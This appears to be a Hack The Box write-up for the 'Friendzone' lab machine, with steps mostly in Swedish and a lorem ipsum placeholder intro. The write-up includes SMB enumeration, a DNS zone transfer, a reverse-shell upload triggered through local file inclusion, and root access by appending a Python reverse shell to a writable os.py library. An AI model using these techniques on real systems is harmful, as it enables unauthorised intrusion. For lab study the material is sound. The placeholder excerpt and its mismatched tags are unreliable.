---
layout: single
title: Friendzone - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2019-06-17
classes: wide
header:
  teaser: /assets/images/htb-writeup-friendzone/friendzone_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-friendzone/friendzone_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


### USER ###

1. Enum standard + extra smb
   nmap -sC -sV -O 10.10.10.123
   nmap --script=smb-enum-shares 10.10.10.123 (visar shares, rättigheter samt path)

2. Ladda hem cred.txt
   smbclient //10.10.10.123/general
   get creds.txt

3. Zone Transfer för att få fram subdomäner
   dig axfr friendzone.red @10.10.10.123

4. Lägg in alla subdomäner i /etc/hosts
   10.10.10.123 friendzone.red
   10.10.10.123 administrator1.friendzone.red
   10.10.10.123 hr.friendzone.red
   10.10.10.123 uploads.friendzone.red

5. Logga in på administrator1 med creds från steg 2

6. Ladda upp reverse shell i SMB map med write-rättigheter (Development)
   smbclient //10.10.10.123/Development
   put r

7. Slå igång nc för att ta emot reverse
   nc -lnvp 4455

8. LFI via dashboard.php för att anropa reverse shell
   Från smb-enum-shares i steg 1 fick vi fram path till Development (/etc/Development), anropa reverse shell:
   dashboard.php?image_id=a.jpg&pagename=../../../../../etc/Development/r

   NOTE1:
   Kan vara värt att ladda upp en test fil innehållande "<?php phpinfo(); ?>" (utan "") för att hitta path till filerna

   NOTE2:
   Anropet kommer se ut såhär: <?php “include/”.include($_GET['pagename'].“.php”); ?>
   Döp INTE din fil till .php då anropet blir ($_GET['../../../../etc/development/x.PHP'].“.php”); ?> och kommer inte lira
   (dubbel .php-filändelse)

9. Plocka user via /home/friend/user.txt

10. Hämta SSH-creds
    ls /var/www/htm/mysql_data.conf
    (f*****:A*************)

### ROOT ###

1. SSH in till boxen
   ssh friend@10.10.10.123

2. Kolla på tjänster som körs med pspy
   2019/06/18 16:24:01 CMD: UID=0    PID=4059   | /bin/sh -c /opt/server_admin/reporter.py 
   2019/06/18 16:24:01 CMD: UID=0    PID=4058   | /bin/sh -c /opt/server_admin/reporter.py 
   2019/06/18 16:24:01 CMD: UID=0    PID=4057   | /usr/sbin/CRON -f 

3. Undersök scriptet reporter.py och se att 'import os' används

4. Import os körs via /usr/lib/python2.7/os.py vilket har +r+w rättigheter (skulle se detta via lse med -l1 flaggan)
   Hittade denna info via kommandot: python -c 'import sys; print "\n".join(sys.path)'
   Samt läste om det på: https://rastating.github.io/privilege-escalation-via-python-library-hijacking/

5. Editera os.py och lägg till one-line python reverse shell längst ner, och vänta på att cron triggar det
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4488));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

6. Starta nc -lvnp 4488 och plocka root.txt
